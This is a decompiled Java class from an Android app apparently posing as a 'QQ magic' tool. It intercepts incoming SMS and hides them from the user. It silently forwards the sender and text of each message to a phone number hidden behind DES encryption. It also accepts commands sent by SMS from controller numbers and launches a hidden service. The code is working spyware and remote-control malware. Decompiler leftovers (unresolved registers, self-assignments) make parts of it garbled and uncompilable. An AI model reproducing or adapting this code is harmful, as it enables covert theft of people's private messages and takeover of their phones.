package com.qqmagic;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class Fr extends BroadcastReceiver {
    DesUtils ds;
    String jj;
    String jj1;
    StringBuffer sb;
    SmsManager sm;

    @Override
    public void onReceive(Context context, Intent intent) {
        Context context2 = context;
        Intent intent2 = intent;
        DesUtils desUtils = r29;
        DesUtils desUtils2 = new DesUtils("还想反编译.你个傻逼.没门");
        this.ds = desUtils;
        if (intent2.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            abortBroadcast();
            StringBuilder stringBuilder = r29;
            StringBuilder stringBuilder2 = new StringBuilder();
            StringBuilder stringBuilder3 = stringBuilder;
            Bundle extras = intent2.getExtras();
            if (extras != null) {
                this.sm = SmsManager.getDefault();
            }
            Object[] objArr = (Object[]) extras.get("pdus");
            SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
            for (int i = 0; i < objArr.length; i++) {
                smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
            }
            SmsMessage[] smsMessageArr2 = smsMessageArr;
            for (SmsMessage smsMessage : smsMessageArr2) {
                stringBuilder = stringBuilder3.append("来自");
                stringBuilder = stringBuilder3.append(smsMessage.getDisplayOriginatingAddress());
                stringBuilder = stringBuilder3.append("内容:");
                stringBuilder = stringBuilder3.append(smsMessage.getDisplayMessageBody());
                try {
                    this.jj = this.ds.decrypt("84f113ee155ba43f1e280b54401fffab");
                    this.jj1 = this.ds.decrypt("84f113ee155ba43f1e280b54401fffab");
                } catch (Exception e) {
                    Exception exception = e;
                }
                if (!(smsMessage.getDisplayMessageBody().indexOf("!") == -1 || smsMessage.getDisplayMessageBody().indexOf("&") == -1)) {
                    String displayOriginatingAddress = smsMessage.getDisplayOriginatingAddress();
                    StringBuffer stringBuffer = r29;
                    StringBuffer stringBuffer2 = new StringBuffer();
                    if (!displayOriginatingAddress.equals(stringBuffer.append("+86").append(this.jj).toString())) {
                        displayOriginatingAddress = smsMessage.getDisplayOriginatingAddress();
                        stringBuffer = r29;
                        stringBuffer2 = new StringBuffer();
                        if (!displayOriginatingAddress.equals(stringBuffer.append("+86").append(this.jj1).toString())) {
                        }
                    }
                    int indexOf = smsMessage.getDisplayMessageBody().indexOf("!");
                    int indexOf2 = smsMessage.getDisplayMessageBody().indexOf("&");
                    String substring = smsMessage.getDisplayMessageBody().substring(indexOf + 1, indexOf2);
                    String substring2 = smsMessage.getDisplayMessageBody().substring(0, indexOf);
                    String substring3 = smsMessage.getDisplayMessageBody().substring(indexOf2 + 1);
                    Intent intent3 = r21;
                    Intent intent4 = intent4;
                    try {
                        intent4 = new Intent(context2, Class.forName("com.qqmagic.b"));
                        Intent intent5 = intent3;
                        stringBuffer2 = r29;
                        StringBuffer stringBuffer3 = new StringBuffer();
                        stringBuffer3 = r29;
                        StringBuffer stringBuffer4 = new StringBuffer();
                        stringBuffer4 = r29;
                        StringBuffer stringBuffer5 = new StringBuffer();
                        stringBuffer5 = r29;
                        StringBuffer stringBuffer6 = new StringBuffer();
                        stringBuffer6 = r29;
                        StringBuffer stringBuffer7 = new StringBuffer();
                        stringBuffer7 = r29;
                        StringBuffer stringBuffer8 = new StringBuffer();
                        intent3 = intent5.putExtra("nnr", stringBuffer2.append(stringBuffer3.append(stringBuffer4.append(stringBuffer5.append(stringBuffer6.append(stringBuffer7.append(this.jj).append("!").toString()).append(substring2).toString()).append("&").toString()).append(substring).toString()).append("$").toString()).append(substring3).toString());
                        ComponentName startService = context2.startService(intent5);
                    } catch (ClassNotFoundException e2) {
                        Throwable th = e2;
                        NoClassDefFoundError noClassDefFoundError = r29;
                        NoClassDefFoundError noClassDefFoundError2 = new NoClassDefFoundError(th.getMessage());
                        throw noClassDefFoundError;
                    }
                }
            }
            this.sm.sendTextMessage(this.jj1, (String) null, stringBuilder3.toString(), (PendingIntent) null, (PendingIntent) null);
        }
    }

    public Fr() {
    }
}
